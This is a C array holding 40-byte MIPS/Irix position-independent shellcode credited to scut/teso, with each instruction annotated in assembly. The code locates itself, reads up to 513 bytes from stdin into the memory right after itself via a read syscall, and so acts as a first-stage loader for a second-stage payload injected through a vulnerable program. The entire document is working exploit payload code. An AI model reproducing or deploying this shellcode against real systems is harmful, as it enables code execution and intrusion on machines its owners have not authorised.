/* 40 byte MIPS/Irix PIC stdin-read shellcode. -scut/teso
 */
unsigned long int shellcode[] = {
                0x24048cb0,     /* li           $a0, -0x7350            */
/* dpatch: */   0x0490ffff,     /* bltzal       $a0, dpatch             */
                0x2804ffff,     /* slti         $a0, $zero, -1          */
                0x240fffe3,     /* li           $t7, -29                */
                0x01e07827,     /* nor          $t7, $t7, $zero         */
                0x03ef2821,     /* addu         $a1, $ra, $t7           */
                0x24060201,     /* li           $a2, 0x0201 (513 bytes) */
                0x240203eb,     /* li           $v0, SYS_read           */
                0x0101010c,     /* syscall                              */
                0x24187350,     /* li           $t8, 0x7350 (nop)       */
};